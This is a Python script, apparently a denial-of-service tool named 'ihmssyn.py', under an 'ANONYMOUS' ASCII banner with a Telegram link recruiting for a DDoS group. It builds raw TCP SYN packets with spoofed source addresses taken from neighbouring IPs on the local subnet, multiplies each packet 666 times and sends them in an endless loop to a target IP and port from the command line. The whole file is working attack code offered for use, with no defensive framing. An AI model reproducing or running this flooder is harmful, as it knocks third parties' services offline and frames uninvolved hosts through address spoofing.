#!/usr/bin/python
import socket
import sys
import time
import random
import os
import struct
from threading import Thread
from struct import *


def usage():
    print ("""
                                                                                
                                .,**//////((((((//**,.                          
                         ..,*//(##%%%&&&&&&&&&&&@@&&&&&&&%,                     
                      ....,,*/(##%%%%&&&&&&&&&&&@@@@&&&&&&&                     
                      .....,*/((%%%&&&&&&&&&&&&&&&&&@&&&&&&*                    
                       ..,,,**/#&&&&&&&&&&%(%&&&&%%%%&&&&&%%                    
                               .(%#%&&&&&%&#*.,*(((##%%*%&&%                    
                      ..,*(((*. .../&&&&&%.../%&&&&&&&&@&&%%                    
                      ..,/(#%%%%(*..(&&&&@%%%&&&&&&&&&&&&&&%                    
                                  ...,#&&&&&(,.......,(##%%%                    
                      .,,***//**....,,#&@@&&&&&&&&&&&&&&&&&&                    
                      ..**////*,....,,#&@@@&&&&&&&&&%&&&&&&%                    
                       .,****,,......,#&@@@@@@@&&&&&&&&&&&%(                    
                        ,,*,.   .....,#&@@@@@&&&&&&&&&&&&&%                     
                      ..   .......*  .#&&&%#&@@@&&&&*,#(&&%                     
                       .     ...,... . .,*/&@@@@&&,,&&(&&&,                     
                           .         *&&&./(#(/*,*&&&%&&&#                      
                          .   ...,*/(##%%%%%&&&&&&&&%&&&%                       
                            .    ...,*/(##%&&&&&&&&&&&&.                        
                             ..  ..*//..*&@@@@@&&&@&&,                          
                                 .,,.. .,*@@@@&@@&&                             
                                  .,.  ./(@@@@&&%                               
                                    .  ./#@&&&                                  
                                        .                                       

  
                                                                                                                                                                                      
    :::     ::::    :::  ::::::::  ::::    ::: :::   ::: ::::    ::::   ::::::::  :::    :::  ::::::::  
  :+: :+:   :+:+:   :+: :+:    :+: :+:+:   :+: :+:   :+: +:+:+: :+:+:+ :+:    :+: :+:    :+: :+:    :+: 
 +:+   +:+  :+:+:+  +:+ +:+    +:+ :+:+:+  +:+  +:+ +:+  +:+ +:+:+ +:+ +:+    +:+ +:+    +:+ +:+        
+#++:++#++: +#+ +:+ +#+ +#+    +:+ +#+ +:+ +#+   +#++:   +#+  +:+  +#+ +#+    +:+ +#+    +:+ +#++:++#++ 
+#+     +#+ +#+  +#+#+# +#+    +#+ +#+  +#+#+#    +#+    +#+       +#+ +#+    +#+ +#+    +#+        +#+ 
#+#     #+# #+#   #+#+# #+#    #+# #+#   #+#+#    #+#    #+#       #+# #+#    #+# #+#    #+# #+#    #+# 
###     ### ###    ####  ########  ###    ####    ###    ###       ###  ########   ########   ########

-> Join now => https://t.me/anonymousddos
""")

ip = int(0)
sourceip = socket.gethostbyname(socket.gethostname())
port = int(0)
bcount = int(0)

def checksum(msg):
    s = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        s = s + w
     
    s = (s>>16) + (s & 0xffff)
    #s = s + (s >> 16);
    #complement and mask to 4 byte short
    s = ~s & 0xffff
     
    return s

def ihmssynpacket():
    a1,a2,a3,a4 = sourceip.split(".")
    global bcount
    bcount = int(a4) - 5
    bcountPAD = int(a4) - 5
    model = int(a4) + 10
    s4 = socket.socket(socket.AF_INET, socket.SOCK_RAW)
    s4.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    while True:
        if not int(a4) >= 5:
            sys.exit('This server is not rasoable to spoof {0}.{1}.{2}.{3}'.format(a1,a2,a3,a4))
            
        if not int(a4) <= 243:
            sys.exit('This server is not rasoable to spoof {0}.{1}.{2}.{3}'.format(a1,a2,a3,a4))
            

        bcount += 1

        if bcount >= model:
            bcount = bcountPAD
         


        source_ip = '{0}.{1}.{2}.{3}'.format(a1,a2,a3,str(bcount))

        dest_ip = ip
        ihl = 5
        version = 4
        tos = 0
        tot_len = 20 + 20 
        id = random.randint(54321,64321)
        frag_off = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        check = 10
        saddr = socket.inet_aton ( source_ip ) 
        daddr = socket.inet_aton ( dest_ip )
        ihl_version = (version << 4) + ihl
        ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
        source = random.randint(1234,65535)
        dest = 80  
        seq = 0
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons (5840)
        check = 0
        urg_ptr = 0
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
        source_address = socket.inet_aton( source_ip )
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length)
        psh = psh + tcp_header
        tcp_checksum = checksum(psh)
        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
        packet2 = (ip_header + tcp_header) * 666


        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
        s4.sendto(packet2,(dest_ip , port))
    else:
        os._exit(1)

def Flood():
    usage() 
    print('\n-> Started with source %s on %s %s.'%(sourceip, ip, port))
    ihmssynpacket()

if len(sys.argv)==1:
    usage()
    sys.exit('Usage: ihmssyn.py <ip> <port>')
else: 
    ip = sys.argv[1]
    port = int(sys.argv[2])
    bytes = "B"*int(254)
    threads = int(2)
    randport=(True,False)[port==0]
    Flood()
